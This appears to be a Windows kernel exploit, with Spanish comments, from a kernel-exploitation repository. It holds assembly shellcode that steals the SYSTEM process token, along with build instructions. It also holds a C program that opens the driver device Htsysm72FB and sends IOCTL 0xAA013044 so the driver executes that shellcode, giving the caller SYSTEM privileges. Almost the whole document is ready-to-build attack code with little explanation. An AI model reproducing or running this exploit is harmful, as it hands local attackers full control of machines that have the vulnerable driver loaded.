```SHELLCODE
;Ensamblamos la shellcode
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;nasm -f win64 shellcode.asm -o shellcode.obj
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Enlazamos 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;x86_64-w64-mingw32-ld -o shellcode.exe shellcode.obj --entry _start
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Desensamblar
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;x86_64-w64-mingw32-objdump -d shellcode.exe > shellcode_disasm.txt
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Extraer Opcodes
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;python3 extract_shellcode.py
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; !!Importante¡¡
; Debemos de extraer del resultado los opcode a partir del primer 'push rcx' (x51)
; Hasta el ultimo 'ret' (xC3) de la funcion RestaurarRegitros
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;



section .text
    global _start

_start:
    call GuardarRegistros
    call PunterosEstructuras
    call BuscarSystem
    call ObtenerToken
    call BuscarCMD
    call CopiarToken
    call RestauraRegistros
    ret

GuardarRegistros:
    push rcx
    push rdx
    push r8
    push r9
    push rdi
    ret

PunterosEstructuras:
    mov rcx, qword [gs:0x188]    ; KTRHEAD
    mov rdx, qword [rcx+0xb8]    ; EPROCESS
    mov r8, qword [rdx+0x2f0]    ; ActiveProcessLinks
    mov rdi, qword [rdx+0x3e8]   ; InheritedFromUniqueProcessId 
    mov rcx, qword [r8]
    ret

BuscarSystem:
    mov rdx, qword [rcx-8]       ; UniqueProcessId
    cmp rdx, 4                   ; PID SYSTEM comparar
    jz ObtenerToken
    mov rcx, qword [rcx]
    jmp BuscarSystem

ObtenerToken:
    mov rax, qword [rcx+0x70]    ; Objeto Token
    and al, 0xf0
    ret

BuscarCMD:
    mov rcx, qword [rcx]         ; Mi proceso
    mov rdx, qword [rcx-8]
    cmp rdx, rdi
    jne BuscarCMD
    ret

CopiarToken:
    mov qword [rcx+0x70], rax    ; Copiar token
    ret

RestauraRegistros:
    pop rdi
    pop r9
    pop r8
    pop rdx
    pop rcx
    ret
```

Exploit

```sh
#include <stdio.h>
#include <Windows.h>

int main()
{
	BYTE ShellCode[] = //86 bytes
	{
		0x51,0x52,0x41,0x50,0x41,0x51,0x57,
		0x65,0x48,0x8B,0x0C,0x25,0x88,0x01,
		0x00,0x00,0x48,0x8B,0x91,0xB8,0x00,
		0x00,0x00,0x4C,0x8B,0x82,0xF0,0x02,
		0x00,0x00,0x48,0x8B,0xBA,0xE8,0x03,
		0x00,0x00,0x49,0x8B,0x08,0x48,0x8B,
		0x51,0xF8,0x48,0x83,0xFA,0x04,0x74,
		0x05,0x48,0x8B,0x09,0xEB,0xF1,0x48,
		0x8B,0x41,0x70,0x24,0xF0,0x48,0x8B,
		0x09,0x48,0x8B,0x51,0xF8,0x48,0x3B,
		0xD7,0x75,0xF4,0x48,0x89,0x41,0x70,
		0x5F,0x41,0x59,0x41,0x58,0x5A,0x59,
		0xC3 //ret
	};

	HANDLE driverConnect = CreateFile(L"\\\\.\\Htsysm72FB", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	/*
	HANDLE CreateFileA(
  [in]           LPCSTR                lpFileName,
  [in]           DWORD                 dwDesiredAccess,
  [in]           DWORD                 dwShareMode,
  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  [in]           DWORD                 dwCreationDisposition,
  [in]           DWORD                 dwFlagsAndAttributes,
  [in, optional] HANDLE                hTemplateFile
);
	*/

	if (driverConnect == INVALID_HANDLE_VALUE)
	{
		fprintf(stderr, "[-] No se puede acceder al Device Deriver\n");
	}

	else {

		PBYTE inBuffer = (PBYTE)VirtualAlloc(0, 100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		DWORD bytesReturned = 0;
		DWORD ioctlOutput = 0;

		*(PULONG_PTR)inBuffer = (ULONG_PTR)(inBuffer + 8); //apuntamos 8 bytes hacia delante
		memcpy(inBuffer + 8, ShellCode, 85); //copiamos 85 bytes, 8 bytes depues de la direccion
		ULONG_PTR target = (ULONG_PTR)(inBuffer + 8); //guardamos la direccion en target

		fprintf(stdout, "[+] Comienza el exploit...\n");

		if (DeviceIoControl(driverConnect, 0xAA013044, &target, 8, &ioctlOutput, 4, &bytesReturned, NULL))
			/*
		BOOL DeviceIoControl(
	  [in]                HANDLE       hDevice,
	  [in]                DWORD        dwIoControlCode,
	  [in, optional]      LPVOID       lpInBuffer,
	  [in]                DWORD        nInBufferSize,
	  [out, optional]     LPVOID       lpOutBuffer,
	  [in]                DWORD        nOutBufferSize,
	  [out, optional]     LPDWORD      lpBytesReturned,
	  [in, out, optional] LPOVERLAPPED lpOverlapped
	);
			*/
		{
			fprintf(stdout, "[+] DeviceIoControl OK... \n");
			fprintf(stdout, "[+] Somos SYSTEM!!!!! \n");
		}
		else {
			fprintf(stderr, "[-] DeviceIoControl ERROR\n");
			system("pause");
		}

		CloseHandle(driverConnect);
	}
}
```
![ IMPORTANTE-PsGetCurrentProcess](https://github.com/kdRajKit/KERNEL-EXPLOITING/assets/108155637/425d7c02-8aa4-4332-a956-e56ca692ea96)

